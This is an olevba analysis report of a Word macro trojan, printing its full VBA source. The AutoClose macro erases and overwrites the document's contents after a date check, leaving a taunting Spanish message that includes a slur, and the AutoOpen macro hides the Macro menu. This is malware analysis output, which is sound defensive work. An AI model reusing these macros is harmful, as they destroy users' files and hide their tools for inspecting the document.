olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Invade
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Invade - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Trojan.MSWord.Invade - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AutoClose()
Attribute AutoClose.VB_Description = "Cierra el documento activo de Microsoft Word"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"
'
' AutoClose Macro
' Cierra el documento activo de Microsoft Word
'

If WordBasic.Day(WordBasic.Now()) > 15 And WordBasic.Month(WordBasic.Now()) > 10 Then

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.ColorIndex = wdRed
    Selection.Font.Size = 26
    Selection.Font.Bold = wdToggle
    Selection.Font.Name = "Comic Sans MS"
    Selection.TypeText Text:="SATÁN TE INVADE...!!!"
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.Font.ColorIndex = wdAuto
    Selection.Font.Bold = wdToggle
    Selection.Font.Bold = wdToggle
    Selection.Font.Name = "Arial"
    Selection.Font.Size = 22
    Selection.TypeText Text:= _
        "Por maricón y maruja, por hablar mal de tus hermanos sin ver"
    Selection.TypeText Text:=" tus defectos."
    ActiveDocument.Save
    Application.Quit
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Trojan.MSWord.Invade - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Abre un documento de Microsoft Word"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoOpen"
'
' AutoOpen Macro
' Abre un documento de Microsoft Word
'
CommandBars("Tools").Controls("Macro").Visible = False

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

